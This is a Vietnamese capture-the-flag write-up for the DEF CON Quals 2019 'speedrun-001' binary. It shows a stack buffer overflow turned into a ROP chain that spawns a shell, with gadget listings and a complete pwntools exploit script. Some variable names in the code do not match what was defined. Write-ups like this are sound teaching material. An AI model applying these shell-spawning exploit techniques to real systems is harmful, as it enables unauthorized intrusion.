### Defcon Quals 2019 Speedrun1
* Check security của binary ta thấy được NX(Non-eXecute) đang được bật, vậy nên việc thực thi trên stack là không thể.
```
 ❯ checksec speedrun-001
[*] '/mnt/c/Users/levan/OneDrive/Documents/CTF/NightMare/speedrun-001'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```
 * Chạy và thấy qua thì chương trình này cho phép nhập vào một chuỗi đầu vào sau đó in ra màn hình dòng chữ 'Alas, ...' 
```
Hello brave new challenger
Any last words?
abcae
This will be the last thing that you say: abcae

Alas, you had no luck today.
```

* Mở bằng IDA và tím đến hàm có chữa các chuỗi được in ra trên màn hình:
```
__int64 sub_400B60()
{
  int v0; // edx
  int v1; // ecx
  int v2; // r8d
  int v3; // r9d
  char buf[1024]; // [rsp+0h] [rbp-400h] BYREF

  sub_410390("Any last words?");
  sub_4498A0(0, buf, 0x7D0uLL);
  return sub_40F710(
           (unsigned int)"This will be the last thing that you say: %s\n",
           (unsigned int)buf,
           v0,
           v1,
           v2,
           v3,
           buf[0]);
}
```

* Có thể thấy được `sub_4498A0` thực hiện việc scan đầu vào, ở trong hàm này, nó đang cố sử dụng syscall với đối số rax = 0 ứng với sys_read() nhằm để đọc dữ liệu đầu vào. Có một điều có thể khai thác ở đây là dữ liệu đọc vào là 2000 trong khi kích thước của buf chỉ có 1024, vậy nên ta có thể overwrite để tạo một syscall và lấy được shell bằng ROP chain (gồm các chuỗi các câu lệnh có sẵn trong chương trình kết thúc bằng ret, ghép lại để tạo ra các tác vụ mong muốn)
* Mục tiêu ở đây là cần thực hiện câu lệnh sys_exec('/bin/sh', 0, 0), tra trong bảng syscall thì ta thấy được rằng rax = 59 ứng với sys_exec, rdi = ''/bin/sh', rsi=0 , rdx=0. Ta đã có được các đối số truyền vào, việc bây giờ ta cần tìm các gadget chứa các thanh ghi mà có thể ghi vào được, ở đây là các lệnh `pop rax ; ret`, ...
```
 ❯ ROPgadget --binary speedrun-001 | grep "pop rax ; ret"
0x0000000000415662 : add ch, al ; pop rax ; ret
0x0000000000415661 : cli ; add ch, al ; pop rax ; ret
0x00000000004a9321 : in al, 0x4c ; pop rax ; retf
0x0000000000415664 : pop rax ; ret
0x000000000048cccb : pop rax ; ret 0x22
0x00000000004a9323 : pop rax ; retf
0x00000000004758a3 : ror byte ptr [rax - 0x7d], 0xc4 ; pop rax ; ret

 ❯ ROPgadget --binary speedrun-001 | grep "pop rdi ; ret"
0x0000000000423788 : add byte ptr [rax - 0x77], cl ; fsubp st(0) ; pop rdi ; ret
0x000000000042378b : fsubp st(0) ; pop rdi ; ret
0x0000000000400686 : pop rdi ; ret
                                                             
 ❯ ROPgadget --binary speedrun-001 | grep "pop rsi ; ret"
0x000000000046759d : add byte ptr [rbp + rcx*4 + 0x35], cl ; pop rsi ; ret
0x000000000048ac68 : cmp byte ptr [rbx + 0x41], bl ; pop rsi ; ret
0x000000000044be39 : pop rdx ; pop rsi ; ret
0x00000000004101f3 : pop rsi ; ret
                                                                
 ❯ ROPgadget --binary speedrun-001 | grep "pop rdx ; ret"
0x00000000004a8881 : js 0x4a88fe ; pop rdx ; retf
0x000000000044be16 : pop rdx ; ret
0x000000000045fe71 : pop rdx ; retf
```
```
# Địa chỉ của các gadget
0x0000000000415664 : pop rax ; ret
0x0000000000400686 : pop rdi ; ret
0x00000000004101f3 : pop rsi ; ret
0x000000000044be16 : pop rdx ; ret
```
* Điều cần làm tiếp theo là tìm một nơi để có thể ghi được dữ liệu vào, cụ thể ở đây là ghi '/bin/sh' vào. Mở gdb sau đó dùng `vmmap` để xem các vùng nhớ
```
gef➤  vmmap
[ Legend:  Code | Heap | Stack ]
Start              End                Offset             Perm Path
0x0000000000400000 0x00000000004b6000 0x0000000000000000 r-x /mnt/c/Users/levan/OneDrive/Documents/CTF/NightMare/speedrun-001
0x00000000006b6000 0x00000000006bc000 0x00000000000b6000 rw- /mnt/c/Users/levan/OneDrive/Documents/CTF/NightMare/speedrun-001
0x00000000006bc000 0x00000000006e0000 0x0000000000000000 rw- [heap]
0x00007ffff7ff9000 0x00007ffff7ffd000 0x0000000000000000 r-- [vvar]
0x00007ffff7ffd000 0x00007ffff7fff000 0x0000000000000000 r-x [vdso]
0x00007ffffffdd000 0x00007ffffffff000 0x0000000000000000 rw- [stack]
```
* Ta có thể ghi vào vùng 0x6b6000, để chắc chắn rằng ta không ghi đè lên thứ gì khác:
```
gef➤  x/10g 0x6b6000
0x6b6000:       0x0     0x0
0x6b6010:       0x0     0x0
0x6b6020:       0x0     0x0
0x6b6030:       0x0     0x0
0x6b6040:       0x0     0x0
```
* Không có gì ở đây cả, cho nên có thể ghi thoải mái, tiếp theo cần tìm một gadget mà cho phép chúng ta ghi dữ liệu vào một địa chỉ trên vùng nhớ
* Tìm ra được lệnh này cho phép ghi giá trị của rdx vào địa chỉ của rax đang trỏ tới
```
0x000000000048d251 : mov qword ptr [rax], rdx ; ret
```
* Cuối cùng là tìm vị trí của syscall trong chương trình
```
0x000000000040129c : syscall
```
* Các bước chuẩn bị đã xong, bây giờ bắt đầu xây dựng ROP chain cho việc lấy shell.
```
# Khởi tạo
raxAddr = 0x0000000000415664
rdiAddr = 0x0000000000400686
rsiAddr = 0x00000000004101f3
rdxAddr = 0x000000000044be16

writeGadget = 0x000000000048d251
sysAddr = 0x000000000040129c
```
* Đầu tiên là cần phải ghi '/bin/sh' vào địa chỉ 0x6b6000 để tí dùng, ta sẽ có chuỗi rop như sau:

```
# pop rax, 0x6b6000
# pop rdx, 0x2f62696e2f736800
# mov qword ptr [rax], rdx

# Chuỗi ROP
rop = b''
rop += p64(raxAddr) + p64(0x6b6000)
rop += p64(rdxAddr) + b'/bin/sh\x00'
rop += p64(writeGadget)
```
* Như vậy ta đã ghi chuỗi vào đc địa chỉ 0x6b6000, tiếp theo tạo syscall với các đối số như phía trên đã mô tả để chạy sys_exec lấy shell
```
# pop rax, 0x3b
# pop rdi, 0x6b6000
# pop rsi, 0x0
# pop rdx, 0x0
# syscall

# Chuỗi ROP
rop += popRax + p64(0x3b)
rop += popRdi + p64(0x6b6000)
rop += popRsi + p64(0)
rop += popRdx + p64(0)
```

* Đặt breakpoint và biết đc rằng cần 1032 byte để ghi đè lên được địa chỉ trả về, sau đây là code exploit đầy đủ
```
from pwn import *
p = process('./speedrun-001')

# gdbscript='''
# b *0x400bad
# '''
# gdb.attach(p, gdbscript=gdbscript)

# Khoi tao ROP Gadget
raxAddr = p64(0x0000000000415664)
rdiAddr = p64(0x0000000000400686)
rsiAddr = p64(0x00000000004101f3)
rdxAddr = p64(0x000000000044be16)

# mov qword ptr [rax], rdx ; ret
writeGadget = p64(0x000000000048d251)

# syscall gadget
sysAddr = p64(0x000000000040129c)

# Ghi /bin/sh vao 0x6b6000
'''
pop rax, 0x6b6000
pop rdx, 0x2f62696e2f736800
mov qword ptr [rax], rdx
'''

rop = b''
rop += raxAddr
rop += p64(0x6b6000)
rop += rdxAddr
rop += b'/bin/sh\x00'
rop += writeGadget

'''
Tiep tuc tao ROP Chain de ghi vao 4 thanh ghi, tao syscall
pop rax, 0x3b
pop rdi, 0x6b6000
pop rsi, 0x0
pop rdx, 0x0

syscall
'''

rop += raxAddr + p64(0x3b)
rop += rdiAddr + p64(0x6b6000)
rop += rsiAddr + p64(0)
rop += rdxAddr + p64(0)

rop += syscall

payload = b'a'*1032 + rop

p.sendline(payload)
p.interactive()
```